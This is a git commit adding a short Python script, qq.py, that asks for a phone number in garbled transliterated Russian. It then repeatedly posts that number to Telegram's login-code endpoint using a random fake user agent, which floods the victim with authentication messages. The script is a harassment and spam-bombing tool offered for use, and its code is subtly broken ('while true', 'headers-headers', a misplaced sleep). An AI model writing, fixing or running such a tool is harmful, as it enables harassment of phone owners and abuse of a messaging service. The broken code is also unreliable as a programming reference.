7a2516bf87a40c42599b525adfe98b04332996f9
Hironotori <81866681+Hironotori@users.noreply.github.com>
2022-01-24 10:04:47 +0200

    Add files via upload

---
+++ qq.py
@@ -0,0 +1,26 @@
+import requests, fake_useragent, time
+
+user = fake_useragent.UserAgent().random
+headers = {'user_agent' : user}
+NUMBER = input('Beeante HOMep tenedona: (6es +)')
+ 
+ 
+ 
+while true:
+ try:
+     response = requests.post('https://my.telegram.org/auth/send_password', headers-headers, data={'phone' : NUMBER})
+     print('+')
+ except:
+     print('=')
+ try:
+     response = requests.post('https://my.telegram.org/auth/send_password', headers-headers, data={'phone' : NUMBER})
+     print('+')
+ except:
+     print('=')
+ try:
+     response = requests.post('https://my.telegram.org/auth/send_password', headers-headers, data={'phone' : NUMBER})
+     print('+')
+ except:
+     print('=')
+     
+time.sleep(5)
